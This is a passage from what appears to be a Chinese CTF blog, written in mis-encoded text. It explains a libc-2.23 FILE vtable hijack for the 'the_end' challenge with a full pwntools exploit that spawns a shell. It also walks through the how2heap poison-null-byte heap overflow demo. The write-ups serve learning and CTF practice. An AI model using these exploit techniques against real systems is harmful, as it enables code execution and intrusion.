ä¸å­˜åœ¨å®‰å…¨æ£€æµ‹ï¼Œæ›´é«˜çš„libcç‰ˆæœ¬é‡Œåˆ™éœ€è¦è®¨è®ºä¿æŠ¤ç»•è¿‡äº†ã€‚</li><li>ä¹‹åè¿˜éœ€è¦æ‰¾åˆ°å‡½æ•°è°ƒç”¨è¿‡è™šè¡¨ä¸­çš„å“ªä¸ªå‡½æ•°(victim_function)ï¼Œé€šè¿‡å›ºå®šåç§»å’Œç¨‹åºä¸­çš„å…¶ä»–æ¼æ´ï¼Œè¿›è¡Œä»»æ„å†™ï¼Œå°†victim_functionæ¢æˆone_gadgetåœ°å€ï¼Œå°±èƒ½getshellã€‚</li></ol><h2 id="0x02-the-end"><a href="#0x02-the-end" class="headerlink" title="0x02 . the_end"></a>0x02 . the_end</h2><h3 id="1-Analysis"><a href="#1-Analysis" class="headerlink" title="1 . Analysis"></a>1 . Analysis</h3><p>â€‹        ä¾‹è¡Œå…¬äº‹å¦‚ä¸‹ï¼š</p><img src="https://s1.ax1x.com/2020/07/14/UNFNnA.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNFNnA.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1" style="zoom:67%;" /><p>â€‹        mainå‡½æ•°å¦‚ä¸‹ï¼Œé™¤æ­¤ä¹‹å¤–æ²¡æœ‰å…¶ä»–ä¹±ä¸ƒå…«ç³Ÿçš„å‡½æ•°äº†ã€‚ã€‚</p><img src="https://s1.ax1x.com/2020/07/14/UNFJ6H.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNFJ6H.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="2" style="zoom: 67%;" /><p>â€‹        åœ¨forå¾ªç¯é‡Œé¢å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºå…è®¸ç”¨æˆ·è¿›è¡Œäº”æ¬¡è¾“å…¥æ“ä½œçš„å¾ªç¯ï¼Œæ¯æ¬¡å¾ªç¯ä¸­ï¼Œå°†ç”¨æˆ·çš„ç¬¬ä¸€æ¬¡è¾“å…¥ä½œä¸ºä¸€ä¸ªåœ°å€ï¼ˆå¯å†™å…¥8ä¸ªå­—èŠ‚ï¼Œå¯¹äº64ä½ç¨‹åºæ¥è¯´æ°å¥½ä¸ºä¸€ä¸ªåœ°å€ï¼‰ï¼Œç”¨æˆ·çš„ç¬¬äºŒæ¬¡è¾“å…¥å°±å°†å†™åœ¨è¿™ä¸ªåœ°å€ä¸­ï¼ˆå¯å†™å…¥1ä¸ªå­—èŠ‚ï¼‰ã€‚</p><p>â€‹        ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°ä»»æ„åœ°å€å†™ï¼Œä¸è¿‡åªèƒ½å†™5ä¸ªå­—èŠ‚ã€‚</p><p>â€‹        ä¸»å‡½æ•°ä¸­ï¼Œforå¾ªç¯çš„ä»»æ„å†™ç»“æŸåå°±æ˜¯exitå‡½æ•°äº†ï¼Œè€Œä¸”é¢˜ç›®â€œthe_endâ€ä¹Ÿå¾ˆæ˜æ˜¾åœ°æç¤ºäº†æ¼æ´åº”è¯¥åœ¨ç»“å°¾å¤„ï¼Œæ‰€ä»¥èªæ˜æœºæ™ºçš„æˆ‘è€ƒè™‘æ¯é¥¬æ¯é¥¬exitå‡½æ•°ã€‚</p><h3 id="2-Attack"><a href="#2-Attack" class="headerlink" title="2 . Attack"></a>2 . Attack</h3><p>â€‹        å»äº†è§£ä¹‹åçŸ¥é“äº†exit()å‡½æ•°ä½œç”¨æ˜¯ç»“æŸå­è¿›ç¨‹ï¼Œè¿”å›ç»™çˆ¶è¿›ç¨‹ï¼Œé‚£å½“ç„¶éœ€è¦æ¸…ç†IOæµå’¯ã€‚åˆäº†è§£åˆ°å®ƒæ¸…ç†IOæµæ—¶ï¼Œç³»ç»Ÿä¼šéå†IO_list_allï¼Œè°ƒç”¨IO_2_1_stdout_ï¼Œå†è°ƒç”¨vtable ä¸­ _setbuf å‡½æ•°ã€‚</p><p>â€‹        ç”¨idaæ‰“å¼€libc-2.23.soï¼Œå…ˆæ‰¾å‡ºIO_2_1_stdout_ç¬¦å·ï¼Œä¹‹åçœ‹ç»“æ„å¯ä»¥ç¡®å®šï¼Œ0x3C56F8å¤„çš„å°±æ˜¯è™šè¡¨ã€‚</p><img src="https://s1.ax1x.com/2020/07/14/UNFYXd.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/14/UNFYXd.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="3" style="zoom: 50%;" /><p>â€‹        æ ¹æ®è™šè¡¨åœ¨64ä½ç¨‹åºä¸­çš„åç§»ï¼Œå¯ä»¥æ±‚å‡ºè™šè¡¨çš„åœ°å€ã€‚</p><p>â€‹        æŸ¥ä¸€ä¸‹ä¸Šé¢çš„è™šå‡½æ•°è¡¨ï¼Œå¯ä»¥è®¡ç®—å‡ºsetbufç›¸å¯¹äºvtableçš„åç§»é‡ä¸º11 * 0x8 = 0x58ï¼ˆ64ä½ï¼‰ã€‚æ ¹æ®setbufçš„åç§»ï¼Œå¯ä»¥æ±‚å‡ºsetbufçš„åœ°å€ã€‚</p><p>â€‹        æ‰€ä»¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯ï¼šä¼ªé€ ä¸€ä¸ªè™šè¡¨ï¼Œå°†fake_vtabel+0x58çš„åœ°æ–¹æ”¹æˆone_gadgetçš„åœ°å€ï¼Œå†å°†è™šè¡¨æŒ‡å‘ä¼ªé€ çš„è™šè¡¨ã€‚ç„¶åå‡½æ•°è°ƒç”¨åˆ°setbufçš„æ—¶å€™å°±ä¼šå®šä½åˆ°ä¼ªé€ è™šè¡¨ä¸­çš„one_gadgetåœ°å€ã€‚</p><p>â€‹        å› ä¸ºæˆ‘ä»¬åªèƒ½å†™å…¥5ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥fake_vtable+0x58ä¸one_gadgetï¼Œè™šè¡¨å’Œä¼ªé€ è™šè¡¨çš„åç§»éƒ½ä¸èƒ½å¤ªå¤§ã€‚æ‰€ä»¥è€ƒè™‘å°†è™šè¡¨å®šä½åœ¨è™šè¡¨çš„é™„è¿‘ï¼Œç”¨ä¸¤ä¸ªå­—èŠ‚æ¥è¦†å†™ï¼Œç„¶åå†ç”¨å‰©ä¸‹ä¸‰ä¸ªå­—èŠ‚å°†one_gadgetå†™å…¥åˆ°fake_vtable+0x58ã€‚</p><p>â€‹        æœ€ågetshellæ—¶éœ€è¦æ³¨æ„ï¼Œç¨‹åºä¸­çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">close(<span class="number">1</span>);</span><br><span class="line">close(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>â€‹        ä¸¤è¡Œä»£ç å°†è¾“å‡ºæµé”™è¯¯æµå…³æ‰äº†ï¼Œæ‰€ä»¥æœ€åæˆ‘ä»¬getshellçš„æ—¶å€™æ²¡æœ‰å›æ˜¾ï¼Œå…·ä½“å¯¹ç­–æ˜¯æœ€ågetshellåï¼Œè¿›è¡Œioé‡å®šå‘ï¼Œå°†è¾“å‡ºæµé‡å®šå‘åˆ°è¾“å…¥æµï¼Œå³ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt 1&gt;&amp;0</span><br></pre></td></tr></table></figure><h3 id="3-Exploitï¼ˆfrom-CTF-WikiğŸ˜“ï¼‰"><a href="#3-Exploitï¼ˆfrom-CTF-WikiğŸ˜“ï¼‰" class="headerlink" title="3.Exploitï¼ˆfrom CTF-WikiğŸ˜“ï¼‰"></a>3.Exploitï¼ˆfrom CTF-WikiğŸ˜“ï¼‰</h3><p>â€‹        ç”±äºè«åå…¶å¦™çš„åŸå› ï¼Œæˆ‘åœ¨ubuntuä¸­è¿è¡Œç¨‹åºçš„æ—¶å€™ï¼Œåªèƒ½è¿›è¡Œ7æ¬¡è¾“å…¥ï¼Œç„¶åå°±ç›´æ¥é€€å‡ºäº†ã€‚ã€‚ã€‚ã€‚ä¹Ÿä¸çŸ¥é“è‡ªå·±å†™çš„expå¯¹ä¸å¯¹ï¼Œè¿˜æ˜¯è´´ä¸€ä¸‹CTF-Wikiçš„å§ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;the_end&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">rem = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> rem ==<span class="number">1</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;150.109.44.250&#x27;</span>,<span class="number">20002</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input your token:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;RyyWrOLHepeGXDy6g9gJ5PnXsBfxQ5uU&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep_ad = p.recvuntil(<span class="string">&#x27;, good luck&#x27;</span>,drop=<span class="literal">True</span>).split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">libc_base = long(sleep_ad,<span class="number">16</span>) - libc.symbols[<span class="string">&#x27;sleep&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xf02b0</span></span><br><span class="line">vtables =     libc_base + <span class="number">0x3C56F8</span></span><br><span class="line"></span><br><span class="line">fake_vtable = libc_base + <span class="number">0x3c5588</span></span><br><span class="line">target_addr = libc_base + <span class="number">0x3c55e0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base: &#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;one_gadget:&#x27;</span>,<span class="built_in">hex</span>(one_gadget)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;exit_addr:&#x27;</span>,<span class="built_in">hex</span>(libc_base + libc.symbols[<span class="string">&#x27;exit&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    p.send(p64(vtables+i))</span><br><span class="line">    p.send(p64(fake_vtable)[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p.send(p64(target_addr+i))</span><br><span class="line">    p.send(p64(one_gadget)[i])</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;exec /bin/sh 1&gt;&amp;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>â€‹        </p><p>â€‹        </p>]]></content>
      
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Off_By_One (plaiddb)</title>
      <link href="2020/03/16/Off_By_One/"/>
      <url>2020/03/16/Off_By_One/</url>
      
        <content type="html"><![CDATA[<p>â€‹        plaiddbå¿«æŠŠæˆ‘è‚å´©æºƒäº†ã€‚ã€‚<span id="more"></span></p><h2 id="0x00-Off-By-One"><a href="#0x00-Off-By-One" class="headerlink" title="0x00 . Off_By_One"></a>0x00 . Off_By_One</h2><p>â€‹        è¿™ä¸ªçŸ¥è¯†ç‚¹åœ¨how2heapé‡Œæ˜¯å«poison_null_byteï¼Œç»“æœæˆ‘ä¸Šctf-wikiæ‰¾writeupçš„æ—¶å€™æ²¡æ‰¾ç€ï¼ŒåŸæ¥äººå®¶ä¹Ÿå«off_by_oneã€‚ä¸‹é¢å…ˆåˆ†æä»£ç ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Welcome to poison null byte 2.0!\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Tested in Ubuntu 14.04 64bit.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span>* a;</span><br><span class="line"><span class="keyword">uint8_t</span>* b;</span><br><span class="line"><span class="keyword">uint8_t</span>* c;</span><br><span class="line"><span class="keyword">uint8_t</span>* b1;</span><br><span class="line"><span class="keyword">uint8_t</span>* b2;</span><br><span class="line"><span class="keyword">uint8_t</span>* d;</span><br><span class="line"><span class="keyword">void</span> *barrier;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);</span><br><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"><span class="keyword">int</span> real_a_size = <span class="built_in">malloc_usable_size</span>(a);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span></span><br><span class="line"><span class="string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment"> * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment"> * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span></span><br><span class="line"><span class="string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line"><span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line"><span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line"><span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span></span><br><span class="line"><span class="string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);</span><br><span class="line"><span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line"><span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span></span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line"><span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line"><span class="comment">// will detect the heap corruption now.</span></span><br><span class="line"><span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line"><span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span></span><br><span class="line"><span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line"><span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,</span><br><span class="line">*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b1: %p\n&quot;</span>,b1);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span></span><br><span class="line"><span class="string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span></span><br><span class="line"><span class="string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);</span><br><span class="line"><span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;b2: %p\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(b2,<span class="string">&#x27;B&#x27;</span>,<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(b1);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;d: %p\n&quot;</span>,d);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);</span><br><span class="line"><span class="built_in">memset</span>(d,<span class="string">&#x27;D&#x27;</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;New b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span></span><br><span class="line"><span class="string">&quot;for the clear explanation of this technique.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹        ä»£ç ä¸€å¼€å§‹è¿˜æ²¡çœ‹æ‡‚æ¥ç€ï¼Œçœ‹ç€å®ƒæŠŠbä¸€åˆ†ä¸ºäºŒä¸€å¤´é›¾æ°´ä¸çŸ¥é“å¹²å•¥ï¼Œåæ¥çœ‹äº†ä¸‹åˆ˜è€æ¿çš„blogæ‰ç†è§£çš„ã€‚</p><p>â€‹        å…¶å¤§è‡´çš„æ„æ€å°±æ˜¯ï¼šç³»ç»Ÿçš„è¾¹ç•Œæ£€æŸ¥ä¸ä¸¥è°¨ï¼Œå½“chunkå¡«å……å¤§å°ä¸ºmalloc_sizeæ—¶ï¼Œæ•´ä¸ªchunkè¢«å­—ç¬¦ä¸²å¡«æ»¡ï¼Œè€Œå­—ç¬¦ä¸²è¿˜éœ€è¦æœ‰â€™\x00â€™å­—ç¬¦ç»“å°¾ï¼Œä¹Ÿå°±å°†ä¸‹ä¸€ä¸ªchunkçš„sizeçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¿®æ”¹äº†ï¼Œæœ‰å¯èƒ½åªæ”¹äº†in_useä½(0x101 â€“&gt; 0x100)ï¼Œæœ‰å¯èƒ½sizeå’Œin_useä½éƒ½æ”¹äº†(0x111 â€“&gt; 0x100)ï¼Œè¿™è¦çœ‹å…·ä½“çš„chunk_sizeå’Œåˆ©ç”¨è¿‡ç¨‹ã€‚</p><p>â€‹        å‚è€ƒå¦‚ä¸‹ç¤ºæ„å›¾ï¼ˆæ²¡æƒ³åˆ°ç”»ä¸ªå›¾è¦é‚£ä¹ˆä¹…ã€‚ã€‚ï¼‰ï¼š</p><p>â€‹        1.a = malloc(0x100)        b = malloc(0x200)        c = malloc(0x100)        barrier = malloc(0x100)æœ€åè¿™ä¸ªchunkæ˜¯ç”¨æ¥éš”å¼€top chunkï¼Œå¦åˆ™å½“cé‡Šæ”¾æ—¶ï¼Œtop chunkä¼šå°†å…¶åˆå¹¶ã€‚</p><p>â€‹        2.æ¥ç€ç”¨açš„æº¢å‡ºå°†b_sizeä¿®æ”¹æˆ0x200ï¼Œå¹¶åŒæ—¶åœ¨b+0x200çš„åœ°æ–¹å†™å…¥0x200ç”¨ä½œfake_pre_sizeç”¨æ¥é€šè¿‡æ£€æŸ¥ã€‚ç„¶åé‡Šæ”¾bã€‚ç³»ç»Ÿå°±ä¼šå°†båˆ°b+0x200çš„ç©ºé—´é‡Šæ”¾ï¼Œè€Œéé‡Šæ”¾æ•´ä¸ªb chunkã€‚</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/1.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/1.png" 